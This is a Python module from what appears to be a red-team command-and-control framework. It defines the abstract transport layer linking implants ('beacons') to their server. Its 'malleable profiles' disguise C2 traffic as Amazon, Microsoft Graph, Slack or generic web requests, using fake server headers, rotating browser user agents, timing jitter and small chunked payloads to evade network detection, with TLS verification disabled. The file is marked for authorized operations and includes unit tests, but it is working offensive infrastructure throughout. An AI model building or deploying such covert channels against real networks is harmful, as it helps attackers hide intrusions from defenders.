"""
Forge C2 — Transport Base Layer
=================================
Abstract transport interface for all C2 communication channels.

Every transport (HTTP/S, DNS, TCP, SMB, etc.) implements this contract
to provide a uniform API for beacon ↔ server communication.

Architecture:
    ┌──────────────────┐
    │  BaseTransport   │  ← you are here
    │  (abstract)      │
    ├──────────────────┤
    │ • connect()      │  Establish channel
    │ • send()         │  Frame + encrypt + ship
    │ • recv()         │  Receive + decrypt + deframe
    │ • disconnect()   │  Tear down cleanly
    │ • heartbeat()    │  Keep-alive / beacon check-in
    └────────┬─────────┘
             │
    ┌────────▼─────────┐   ┌──────────────┐   ┌──────────────┐
    │ HTTPTransport    │   │ DNSTransport  │   │ TCPTransport │
    │ (http_transport) │   │ (dns_transp)  │   │ (tcp_transp) │
    └──────────────────┘   └──────────────┘   └──────────────┘

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import abc
import hashlib
import json
import logging
import os
import random
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

log = logging.getLogger("forge.c2.transport")


# ══════════════════════════════════════════════════════════════════════
#  MALLEABLE C2 PROFILES
# ══════════════════════════════════════════════════════════════════════

class TransportType(str, Enum):
    """Supported transport types."""
    HTTP    = "http"
    HTTPS   = "https"
    DNS     = "dns"
    TCP     = "tcp"
    SMB     = "smb"


@dataclass
class MalleableProfile:
    """Malleable C2 profile — controls how traffic looks on the wire.

    Inspired by Cobalt Strike profiles but way less cringe about it.
    Controls URIs, headers, cookies, user agents, body transforms,
    and timing to blend C2 traffic into legitimate web noise.

    Attributes:
        name:               Profile identifier.
        user_agents:        Rotation pool of User-Agent strings.
        get_uris:           URIs for beacon check-in (GET-like polls).
        post_uris:          URIs for data submission (POST results).
        register_uris:      URIs for initial beacon registration.
        headers:            Extra HTTP headers to include.
        server_headers:     Headers the server sends back (blending).
        body_prepend:       Bytes prepended to encrypted payload.
        body_append:        Bytes appended to encrypted payload.
        cookie_name:        Cookie used to smuggle beacon ID.
        param_name:         Query parameter for data smuggling.
        content_type:       MIME type for POST bodies.
        jitter_pct:         Timing jitter for check-ins.
        sleep_seconds:      Default sleep between check-ins.
        max_data_per_req:   Max bytes per request (chunking threshold).
        ssl_verify:         Whether to verify TLS certs (lol no in ops).
    """
    name:              str = "default"

    # ── Request shaping ───────────────────────────────────────────────
    user_agents: list[str] = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) "
        "Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
    ])
    get_uris: list[str] = field(default_factory=lambda: [
        "/api/v1/check",
        "/updates/check",
        "/content/status",
        "/feed/latest",
        "/assets/config.json",
    ])
    post_uris: list[str] = field(default_factory=lambda: [
        "/api/v1/result",
        "/submit/data",
        "/telemetry/event",
        "/content/upload",
    ])
    register_uris: list[str] = field(default_factory=lambda: [
        "/api/v1/register",
        "/setup/init",
        "/auth/device",
    ])

    # ── Headers ───────────────────────────────────────────────────────
    headers: dict[str, str] = field(default_factory=lambda: {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
    })
    server_headers: dict[str, str] = field(default_factory=lambda: {
        "Server": "Microsoft-IIS/10.0",
        "X-Powered-By": "ASP.NET",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "SAMEORIGIN",
    })

    # ── Body transforms ───────────────────────────────────────────────
    body_prepend:    bytes = b""
    body_append:     bytes = b""
    cookie_name:     str = "PHPSESSID"
    param_name:      str = "q"
    content_type:    str = "application/octet-stream"

    # ── Timing ────────────────────────────────────────────────────────
    jitter_pct:      float = 20.0
    sleep_seconds:   float = 60.0
    max_data_per_req: int = 1048576  # 1MB

    # ── TLS ───────────────────────────────────────────────────────────
    ssl_verify:      bool = False

    def random_user_agent(self) -> str:
        """Pick a random UA from the pool."""
        return random.choice(self.user_agents) if self.user_agents else ""

    def random_get_uri(self) -> str:
        return random.choice(self.get_uris) if self.get_uris else "/check"

    def random_post_uri(self) -> str:
        return random.choice(self.post_uris) if self.post_uris else "/submit"

    def random_register_uri(self) -> str:
        return random.choice(self.register_uris) if self.register_uris else "/register"

    def wrap_body(self, payload: bytes) -> bytes:
        """Apply body transforms (prepend/append) to encrypted payload."""
        return self.body_prepend + payload + self.body_append

    def unwrap_body(self, body: bytes) -> bytes:
        """Strip body transforms to recover encrypted payload."""
        pre = len(self.body_prepend)
        post = len(self.body_append)
        if post > 0:
            return body[pre:-post]
        return body[pre:]

    def jittered_sleep(self) -> float:
        """Calculate sleep with jitter applied."""
        jitter_range = self.sleep_seconds * (self.jitter_pct / 100.0)
        return self.sleep_seconds + random.uniform(-jitter_range, jitter_range)

    def build_request_headers(self) -> dict[str, str]:
        """Build a complete set of request headers."""
        hdrs = dict(self.headers)
        hdrs["User-Agent"] = self.random_user_agent()
        hdrs["Content-Type"] = self.content_type
        return hdrs

    def build_response_headers(self, body_len: int) -> dict[str, str]:
        """Build server response headers."""
        hdrs = dict(self.server_headers)
        hdrs["Content-Length"] = str(body_len)
        hdrs["Content-Type"] = self.content_type
        hdrs["Connection"] = "close"
        return hdrs

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "user_agents": len(self.user_agents),
            "get_uris": self.get_uris,
            "post_uris": self.post_uris,
            "register_uris": self.register_uris,
            "sleep_seconds": self.sleep_seconds,
            "jitter_pct": self.jitter_pct,
        }


# ── Built-in profiles ────────────────────────────────────────────────

PROFILES: dict[str, MalleableProfile] = {
    "default": MalleableProfile(name="default"),

    "amazon": MalleableProfile(
        name="amazon",
        get_uris=["/s", "/gp/product", "/gp/cart/view.html", "/dp/B0"],
        post_uris=["/gp/cart/ajax-update.html", "/hz/reviews-render/ajax/"],
        register_uris=["/ap/signin"],
        headers={
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
        },
        server_headers={
            "Server": "Server",
            "x-amz-rid": "".join(random.choices(string.ascii_uppercase + string.digits, k=20)),
            "X-Frame-Options": "SAMEORIGIN",
        },
        cookie_name="session-id",
        content_type="text/html; charset=UTF-8",
    ),

    "microsoft": MalleableProfile(
        name="microsoft",
        get_uris=[
            "/v1.0/me/drive/root",
            "/v1.0/me/messages",
            "/v1.0/users",
            "/common/oauth2/v2.0/token",
        ],
        post_uris=[
            "/v1.0/me/drive/root:/upload",
            "/v1.0/me/sendMail",
        ],
        register_uris=["/common/oauth2/v2.0/authorize"],
        headers={
            "Accept": "application/json",
            "Authorization": "Bearer " + "x" * 40,
        },
        server_headers={
            "Server": "Microsoft-IIS/10.0",
            "X-Powered-By": "ASP.NET",
            "request-id": str(os.urandom(16).hex()),
        },
        cookie_name="MUID",
        content_type="application/json; charset=utf-8",
    ),

    "slack": MalleableProfile(
        name="slack",
        get_uris=[
            "/api/conversations.list",
            "/api/users.list",
            "/api/team.info",
        ],
        post_uris=[
            "/api/chat.postMessage",
            "/api/files.upload",
        ],
        register_uris=["/api/auth.test"],
        headers={
            "Accept": "application/json",
            "Authorization": "Bearer xoxb-" + "0" * 40,
        },
        server_headers={
            "Server": "Apache",
            "x-slack-req-id": os.urandom(8).hex(),
        },
        cookie_name="d",
        content_type="application/json; charset=utf-8",
    ),

    "paranoid": MalleableProfile(
        name="paranoid",
        sleep_seconds=300.0,       # 5 min intervals — slow and low
        jitter_pct=50.0,           # High jitter — looks random
        max_data_per_req=4096,     # Tiny payloads — blend into noise
        get_uris=["/"],
        post_uris=["/"],
        register_uris=["/"],
        headers={"Accept": "*/*"},
        server_headers={"Server": "nginx"},
        content_type="text/html",
    ),
}


def get_profile(name: str = "default") -> MalleableProfile:
    """Look up a malleable profile by name."""
    return PROFILES.get(name, PROFILES["default"])


# ══════════════════════════════════════════════════════════════════════
#  TRANSPORT STATS
# ══════════════════════════════════════════════════════════════════════

@dataclass
class TransportStats:
    """Runtime statistics for a transport channel."""
    bytes_sent:     int = 0
    bytes_received: int = 0
    messages_sent:  int = 0
    messages_recv:  int = 0
    connections:    int = 0
    errors:         int = 0
    last_activity:  float = field(default_factory=time.time)
    started_at:     float = field(default_factory=time.time)

    def record_send(self, nbytes: int) -> None:
        self.bytes_sent += nbytes
        self.messages_sent += 1
        self.last_activity = time.time()

    def record_recv(self, nbytes: int) -> None:
        self.bytes_received += nbytes
        self.messages_recv += 1
        self.last_activity = time.time()

    def record_error(self) -> None:
        self.errors += 1

    def to_dict(self) -> dict[str, Any]:
        uptime = time.time() - self.started_at
        return {
            "bytes_sent": self.bytes_sent,
            "bytes_received": self.bytes_received,
            "messages_sent": self.messages_sent,
            "messages_recv": self.messages_recv,
            "connections": self.connections,
            "errors": self.errors,
            "uptime_seconds": round(uptime, 1),
        }


# ══════════════════════════════════════════════════════════════════════
#  BASE TRANSPORT (ABSTRACT)
# ══════════════════════════════════════════════════════════════════════

class BaseTransport(abc.ABC):
    """Abstract base class for C2 transports.

    All transports — HTTP, DNS, TCP, SMB, whatever twisted protocol
    you dream up — must implement this interface.

    Lifecycle:
        1. __init__() → configure
        2. connect() → establish channel
        3. send() / recv() → communicate (loop)
        4. disconnect() → clean shutdown

    Both beacon-side (client) and server-side (listener) transports
    share this interface. The `role` attribute distinguishes them.
    """

    def __init__(
        self,
        transport_type: TransportType,
        profile: MalleableProfile | None = None,
        role: str = "client",   # "client" (beacon) or "server" (listener)
    ) -> None:
        self.transport_type = transport_type
        self.profile = profile or get_profile("default")
        self.role = role
        self.stats = TransportStats()
        self._connected = False
        self._channel_id = os.urandom(8).hex()

    @property
    def connected(self) -> bool:
        return self._connected

    # ── Required overrides ────────────────────────────────────────────

    @abc.abstractmethod
    async def connect(self, host: str, port: int, **kwargs: Any) -> bool:
        """Establish the transport channel.

        Args:
            host: Remote host (or bind address for servers).
            port: Remote port (or bind port for servers).

        Returns:
            True if connection successful.
        """
        ...

    @abc.abstractmethod
    async def send(self, data: bytes) -> bool:
        """Send data over the transport.

        Implementations handle framing, encryption wrapping,
        and profile-based transforms.

        Args:
            data: Raw bytes to send (already encrypted by crypto layer).

        Returns:
            True if send successful.
        """
        ...

    @abc.abstractmethod
    async def recv(self, timeout: float = 30.0) -> bytes | None:
        """Receive data from the transport.

        Args:
            timeout: Max seconds to wait for data.

        Returns:
            Received bytes (still encrypted), or None on timeout/error.
        """
        ...

    @abc.abstractmethod
    async def disconnect(self) -> None:
        """Cleanly shut down the transport channel."""
        ...

    # ── Optional overrides ────────────────────────────────────────────

    async def heartbeat(self) -> bool:
        """Send a keepalive / check-in signal.

        Default implementation sends an empty payload.
        Override for transport-specific keepalive mechanisms.
        """
        return await self.send(b"")

    async def negotiate(self, beacon_id: str, metadata: dict[str, Any]) -> dict[str, Any]:
        """Initial handshake — sends metadata, receives session config.

        Default: JSON encode metadata, send, wait for JSON response.
        """
        payload = json.dumps({
            "beacon_id": beacon_id,
            **metadata,
        }).encode()

        if not await self.send(payload):
            return {}

        response = await self.recv(timeout=15.0)
        if not response:
            return {}

        try:
            return json.loads(response)
        except (json.JSONDecodeError, UnicodeDecodeError):
            return {}

    # ── Convenience ───────────────────────────────────────────────────

    def send_json(self, data: dict[str, Any]) -> bytes:
        """Serialize dict to JSON bytes (caller still needs to await send())."""
        return json.dumps(data, separators=(",", ":"), default=str).encode()

    def recv_json(self, data: bytes) -> dict[str, Any] | None:
        """Parse received bytes as JSON."""
        try:
            return json.loads(data)
        except (json.JSONDecodeError, UnicodeDecodeError):
            return None

    def summary(self) -> dict[str, Any]:
        return {
            "type": self.transport_type.value,
            "role": self.role,
            "profile": self.profile.name,
            "connected": self._connected,
            "channel_id": self._channel_id,
            "stats": self.stats.to_dict(),
        }


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestMalleableProfile:
    """Tests for malleable C2 profile system."""

    def test_default_profile(self) -> None:
        p = get_profile("default")
        assert p.name == "default"
        assert len(p.user_agents) > 0
        assert len(p.get_uris) > 0

    def test_body_wrap_unwrap(self) -> None:
        p = MalleableProfile(body_prepend=b"HEAD", body_append=b"TAIL")
        original = b"secret_payload"
        wrapped = p.wrap_body(original)
        assert wrapped.startswith(b"HEAD")
        assert wrapped.endswith(b"TAIL")
        unwrapped = p.unwrap_body(wrapped)
        assert unwrapped == original

    def test_jittered_sleep(self) -> None:
        p = MalleableProfile(sleep_seconds=60.0, jitter_pct=50.0)
        sleeps = [p.jittered_sleep() for _ in range(100)]
        assert min(sleeps) >= 30.0
        assert max(sleeps) <= 90.0

    def test_named_profiles(self) -> None:
        for name in ("amazon", "microsoft", "slack", "paranoid"):
            p = get_profile(name)
            assert p.name == name

    def test_request_headers(self) -> None:
        p = get_profile("default")
        hdrs = p.build_request_headers()
        assert "User-Agent" in hdrs
        assert "Content-Type" in hdrs


class TestTransportStats:
    """Tests for transport stats tracking."""

    def test_record_send(self) -> None:
        s = TransportStats()
        s.record_send(1024)
        assert s.bytes_sent == 1024
        assert s.messages_sent == 1

    def test_record_recv(self) -> None:
        s = TransportStats()
        s.record_recv(512)
        assert s.bytes_received == 512
        assert s.messages_recv == 1

    def test_to_dict(self) -> None:
        s = TransportStats()
        d = s.to_dict()
        assert "bytes_sent" in d
        assert "uptime_seconds" in d
